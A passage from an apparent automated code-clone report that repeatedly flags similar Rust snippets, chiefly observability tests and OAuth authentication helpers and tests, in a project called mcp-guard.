**Code:**
```
    fn test_init_metrics_multiple_calls() {
        // Init metrics multiple times should not panic
        // (subsequent calls return local recorder handles)
        let handle1 = create_metrics_handle();
        let handle2 = create_metrics_handle();
        
        // Both should render valid output
        let _ = handle1.render();
        let _ = handle2.render();
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 386

**Code:**
```
    fn test_init_tracing_otel_disabled() {
        let config = TracingConfig {
            enabled: false,
            // ... other fields default
            ..Default::default()
        };
        // Should ignore config if enabled is false
        let guard = init_tracing(true, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 402

**Code:**
```
    fn test_tracing_config_sample_rate_boundaries() {
        // Test sample rate 0.0 (always off)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.0);
        
        // Test sample rate 1.0 (always on)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 1.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 1.0);
        
        // Test middle value
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.5,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 314

**Code:**
```
    fn test_record_functions_dont_panic() {
        // These functions should not panic even without a recorder installed
        // (metrics crate provides a no-op recorder by default)
        record_request("POST", 200, std::time::Duration::from_millis(50));
        record_auth("api_key", true);
        record_auth("jwt", false);
        record_rate_limit(true);
        record_rate_limit(false);
        set_active_identities(5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 402

**Code:**
```
    fn test_tracing_config_sample_rate_boundaries() {
        // Test sample rate 0.0 (always off)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.0);
        
        // Test sample rate 1.0 (always on)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 1.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 1.0);
        
        // Test middle value
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.5,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 344

**Code:**
```
    fn test_record_request_various_methods() {
        record_request("GET", 200, std::time::Duration::from_millis(10));
        record_request("POST", 201, std::time::Duration::from_millis(20));
        record_request("DELETE", 204, std::time::Duration::from_millis(5));
        record_request("PUT", 400, std::time::Duration::from_millis(15));
        record_request("PATCH", 500, std::time::Duration::from_millis(100));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 344

**Code:**
```
    fn test_record_request_various_methods() {
        record_request("GET", 200, std::time::Duration::from_millis(10));
        record_request("POST", 201, std::time::Duration::from_millis(20));
        record_request("DELETE", 204, std::time::Duration::from_millis(5));
        record_request("PUT", 400, std::time::Duration::from_millis(15));
        record_request("PATCH", 500, std::time::Duration::from_millis(100));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 314

**Code:**
```
    fn test_record_functions_dont_panic() {
        // These functions should not panic even without a recorder installed
        // (metrics crate provides a no-op recorder by default)
        record_request("POST", 200, std::time::Duration::from_millis(50));
        record_auth("api_key", true);
        record_auth("jwt", false);
        record_rate_limit(true);
        record_rate_limit(false);
        set_active_identities(5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 353

**Code:**
```
    fn test_record_auth_various_providers() {
        record_auth("api_key", true);
        record_auth("jwt", true);
        record_auth("oauth", true);
        record_auth("mtls", true);
        record_auth("api_key", false);
        record_auth("jwt", false);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 402

**Code:**
```
    fn test_tracing_config_sample_rate_boundaries() {
        // Test sample rate 0.0 (always off)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.0);
        
        // Test sample rate 1.0 (always on)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 1.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 1.0);
        
        // Test middle value
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.5,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.1% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.1% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 576

**Code:**
```
    fn test_parse_token_info_github_userinfo() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "id": 12345,
            "login": "octocat",
            "name": "The Octocat"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert_eq!(info.user_id, Some("12345".to_string()));
        assert_eq!(info.username, Some("The Octocat".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 576

**Code:**
```
    fn test_parse_token_info_github_userinfo() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "id": 12345,
            "login": "octocat",
            "name": "The Octocat"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert_eq!(info.user_id, Some("12345".to_string()));
        assert_eq!(info.username, Some("The Octocat".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 557

**Code:**
```
    fn test_parse_token_info_introspection() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": true,
            "sub": "user123",
            "username": "testuser",
            "scope": "read:user repo"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(info.active);
        assert_eq!(info.user_id, Some("user123".to_string()));
        assert_eq!(info.username, Some("testuser".to_string()));
        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 576

**Code:**
```
    fn test_parse_token_info_github_userinfo() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "id": 12345,
            "login": "octocat",
            "name": "The Octocat"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert_eq!(info.user_id, Some("12345".to_string()));
        assert_eq!(info.username, Some("The Octocat".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 592

**Code:**
```
    fn test_parse_token_info_inactive() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": false
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(!info.active);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
